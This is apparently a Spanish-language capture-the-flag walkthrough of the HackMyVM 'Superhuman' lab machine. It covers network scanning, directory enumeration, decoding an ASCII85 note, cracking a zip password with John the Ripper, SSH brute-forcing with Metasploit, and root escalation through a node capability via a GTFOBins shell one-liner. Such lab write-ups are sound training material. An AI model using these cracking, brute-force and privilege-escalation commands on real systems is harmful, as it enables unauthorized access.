## MAQUINA SUPERHUMAN 

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20233159.png)

Hacemos un escaneo de red con arp-scan

```console
arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:57:91:54, IPv4: 192.168.0.162
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     f8:08:4f:71:a2:de       Sagemcom Broadband SAS
192.168.0.33    08:00:27:1d:22:f1       PCS Systemtechnik GmbH
192.168.0.234   4c:82:a9:09:41:63       CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.
192.168.0.232   18:c0:4d:26:7c:42       GIGA-BYTE TECHNOLOGY CO.,LTD.
```
![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20212435.png)

Listo ya tenemos la ip victima, ahora lanzamos un ping a ella para verificar que tengamos conectividad

```console
ping -c 3 192.168.0.33
PING 192.168.0.33 (192.168.0.33) 56(84) bytes of data.
64 bytes from 192.168.0.33: icmp_seq=1 ttl=64 time=3.54 ms
64 bytes from 192.168.0.33: icmp_seq=2 ttl=64 time=1.19 ms
64 bytes from 192.168.0.33: icmp_seq=3 ttl=64 time=0.815 ms
```

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20212529.png)

Lanzamos un escaneo con nmap a la maquina victima para ver que puertos y servicios estan abiertos:

```console
nmap -A -T5 192.168.0.33 -oN escaneo2.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 21:25 -03
Nmap scan report for superhuman.fibertel.com.ar (192.168.0.33)
Host is up (0.0011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9e:41:5a:43:d8:b3:31:18:0f:2e:32:36:cf:68:c4:b7 (RSA)
|   256 6f:24:81:b4:3d:e5:b9:c8:47:bf:b2:8b:bf:41:2d:51 (ECDSA)
|_  256 49:5f:c0:7a:42:20:76:76:d5:29:1a:65:bf:87:d2:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:1D:22:F1 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20212619.png)

La pagina nos arroja un entorno todo en blanco, el cual no nos sirve de nada, asi que vamos a realizar un escaneo de directorios ocultos con gobuster.

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20224922.png)

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20212930.png)

```console
gobuster dir --url http://192.168.0.33/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt.

Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
/notes-tips.txt       (Status: 200) [Size: 358]
```
CONSEJO: "Prueben ese directorio y mandenle full a los hilos porque tarda"

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20223932.png)

El gobuster nos arroja un directorio llamado /notes-tips.txt, ingresamos a ella y tenemos esta cadena de texto rara.

```console
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

Para decodificar esto utilize la siguiente pagina ya que no podia decifrarla.

>https://www.dcode.fr/ascii-85-encoding

Una vez decodifcada dice lo siguiente:

>salome doesn't want me, I'm so sad... i'm sure god is dead...

>I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll

>desire me. I'll name it salome_and_?? I don't know.

>I must not forget to save it and put a good extension because I don't have much storage

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20225309.png)

Al parecer el que escribio esta nota, guardo un poema que se llama salome_and_??.

Bien si nos ponemos a pensar dice que lo guardo en una extension porque no tenia espacio xD, eso nos da una pista de que puedo ser una extension tar,zip,gz.. otro caso son los signos de pregunta de como se llama el poema "??", piensen, yo supongo que como habla de él debe ser "me".

Vamos a ver si existe, coloquemos las posibilidades en el navegador.

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20225700.png)

Se nos descargo un archivo, con john the ripper vamos a tratar de creakear la pass del archivo.

```console
zip2john salome_and_me.zip > hash-zip
```
![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20230110.png)

Luego: 

```console

john --wordlist=/usr/share/wordlists/rockyou.txt hash-zip 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (salome_and_me.zip/salome_and_me.txt)     
1g 0:00:00:00 DONE (2024-04-13 23:00) 16.66g/s 170666p/s 170666c/s 170666C/s 123456..1asshole
Use the "--show" option to display all of the cracked passwords reliably
```
![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20230115.png)

Una vez descargado leemos el poema y aca tenemos al dueño del poema el Sr. fred.

```console
----------------------------------------------------

             GREAT POEM FOR SALOME

----------------------------------------------------


My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!

```

Ya tenemos una credencial, si pensamos y leemos el poema, notamos que tiene palabras medias raras, lo que hize fue colocar todas las palabras una debajo de la otra para luego utilizarla de contraseñas para logearnos en el SSH.

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20230436.png)

Con metasploit vamos a ingresar las opciones para ver si conseguimos dar con la contraseña.

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20231410.png)

Y BIEN! obtivimos la password, aclaro que tambien se puede hacer son "hydra" a la fuerza bruta.

Ingresamos con las credenciales y somos el usuario fred.

Chusmeamos a que tenemos por delante

```console
fred@superhuman:~$ uname -a 
Linux superhuman 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
fred@superhuman:~$ lsb_release -a 
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster
```

Aca hay un pequeño detalle, al listar el contenido del directorio, esta nos bota o rechaza o nos saca como quieran decirlo, asi que encontra esta forma de buscar y leer las flags ya que si le coloque el "ID" y no me saco XD.

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20232002.png)

```console

find / -type f -name '*.txt' 2>/dev/null
/home/fred/cmd.txt
/home/fred/user.txt
/var/www/html/notes-tips.txt
```

Excelente, ahora nos queda por escalar privilegios, para eso utilizamos el siguiente:

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20232740.png)

Hay una capabilities que podemos explotar, en este caso vamos a gtfobins >> node >> y vemos que tenemos las capabilities. Para loguearnos como root usamos el siguiente comando.

>fred@superhuman:/$ which node
/usr/bin/node
fred@superhuman:/$ /usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

![](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-13%20232957.png)


##SOMOS ROOT.



